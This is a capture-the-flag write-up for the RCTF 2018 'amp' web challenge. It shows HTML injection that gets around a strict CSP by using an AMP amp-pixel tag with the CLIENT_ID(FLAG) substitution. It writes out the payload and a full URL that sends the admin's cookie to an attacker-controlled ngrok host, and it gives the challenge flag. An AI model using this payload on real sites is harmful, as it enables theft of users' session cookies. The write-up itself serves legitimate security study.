@@ -1,0 +1,35 @@
+---
+title: amp - RCTF 2018
+layout: post
+date: '2018-05-21 21:30:00'
+---
+
+> Building the future web, together.
+> 
+> http://amp.2018.teamrois.cn
+
+*487 points, 22 Solves, web*
+
+Visiting the page just gives us a simple message `HEY, INPUT YOUR NAME AFTER QUERYSTRING`. So appending **?name=vakzz** to the url reveals:
+
+![tracked](/assets/rctf18/tracked.jpg)
+
+Clicking the button takes us to another page telling us `We logged your request and contacted admin`
+
+Trying a simple XSS like **?name=<i>vakzz</i>** works too! But scripts do not work as there is a strict CSP header **Content-Security-Policy: script-src 'nonce-8c31c3d90fd110285d3ee11963f40e56' 'strict-dynamic'; style-src 'unsafe-inline'** preventing anything from being run. The response also reveals what we are trying to steal **Set-Cookie: FLAG=flag_is_in_admin_cookie**
+
+So we can inject any html and have a button to send it to the admin, and we need to steal the `FLAG` cookie. Looking at the source there is a script included `https://cdn.ampproject.org/v0.js` which is for [AMP](https://www.ampproject.org/learn/overview/). They have a [bunch of component](https://www.ampproject.org/docs/reference/components) for building web pages.
+
+After looking at the avaible components, I came across [amp-pixel](https://www.ampproject.org/docs/reference/components/amp-pixel) which lets you ping back when you have a visitor. It also supports a bunch of [substitutions](https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md) including [CLIENT_ID](https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id) which takes a fallback cookie name! So we can just inject the following snippet and the pixel will do the rest:
+
+```html
+<amp-pixel src="http://my.server?CLIENT_ID(FLAG)"></amp-pixel>
+```
+
+I fired up [ngrok](https://ngrok.com/) went to `http://amp.2018.teamrois.cn/?name=%3Camp-pixel%20src=%22https://3aa73ec2.ngrok.io?CLIENT_ID(FLAG)%22%3E%3C/amp-pixel%3Evakzz` and clicked the button. Looking at the request in ngrok:
+
+![ngrok](/assets/rctf18/ngrok.jpg)
+
+&nbsp;
+
+`RCTF{El_PsY_CONGRO0_sg0}`
